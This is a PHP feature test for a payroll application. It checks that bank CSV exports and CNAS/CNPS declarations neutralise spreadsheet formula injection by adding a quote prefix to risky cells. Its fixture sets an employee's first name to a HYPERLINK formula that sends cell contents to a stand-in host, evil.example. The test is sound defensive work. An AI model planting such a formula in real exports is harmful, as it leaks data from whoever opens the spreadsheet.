<?php

declare(strict_types=1);

namespace Tests\Feature\Payroll;

use App\Core\Auth\Domain\Models\Employee;
use App\Core\Tenant\Domain\Models\Company;
use App\Modules\Payroll\Domain\Models\PayrollRun;
use App\Modules\Payroll\Domain\Models\PaySlip;
use App\Modules\Payroll\Infrastructure\Services\BankExportGenerator;
use App\Modules\Payroll\Infrastructure\Services\CnasDeclarationGenerator;
use App\Modules\Payroll\Infrastructure\Services\CnpsDeclarationGenerator;
use Tests\RefreshTenantDatabase;
use Tests\TestCase;

/**
 * #6556 — injection de formules CSV (OWASP = + - @ TAB CR) dans les exports
 * bancaires et déclarations CNAS/CNPS : le préfixe `'` doit être ajouté aux
 * cellules texte commençant par un préfixe de formule.
 */
class CsvInjectionExportsTest extends TestCase
{
    use RefreshTenantDatabase;

    private const MALICIOUS_NAME = '=HYPERLINK("https://evil.example/?d="&A1)';

    private function runWithMaliciousEmployee(): PayrollRun
    {
        /** @var Company $company */
        $company = Company::factory()->create();
        /** @var PayrollRun $run */
        $run = PayrollRun::create([
            'company_id' => $company->id,
            'period_start' => '2026-07-01',
            'period_end' => '2026-07-31',
            'country_code' => 'DZ',
            'status' => 'validated',
        ]);
        /** @var Employee $employee */
        $employee = Employee::factory()->create([
            'company_id' => $company->id,
            'first_name' => self::MALICIOUS_NAME,
            'last_name' => 'Normal',
        ]);
        PaySlip::create([
            'company_id' => $company->id,
            'payroll_run_id' => $run->id,
            'employee_id' => $employee->id,
            'period_start' => '2026-07-01',
            'period_end' => '2026-07-31',
            'gross_salary' => 60000,
            'net_salary' => 47558,
        ]);

        return $run;
    }

    public function test_bank_csv_generic_neutralizes_formula_prefix(): void
    {
        $run = $this->runWithMaliciousEmployee();

        $content = (new BankExportGenerator)->generate($run, 'csv_generic');

        $this->assertStringContainsString("'=HYPERLINK", $content);
    }

    public function test_cnas_declaration_neutralizes_formula_prefix(): void
    {
        $run = $this->runWithMaliciousEmployee();

        $content = (new CnasDeclarationGenerator)->generate($run);

        $this->assertStringContainsString("'=HYPERLINK", $content);
    }

    public function test_cnps_declaration_neutralizes_formula_prefix(): void
    {
        $run = $this->runWithMaliciousEmployee();

        $content = (new CnpsDeclarationGenerator)->generate($run);

        $this->assertStringContainsString("'=HYPERLINK", $content);
    }

    public function test_amounts_are_not_prefixed(): void
    {
        $run = $this->runWithMaliciousEmployee();

        $content = (new BankExportGenerator)->generate($run, 'csv_generic');

        $this->assertStringContainsString('47558', $content);
        $this->assertStringNotContainsString("'47558", $content);
    }
}
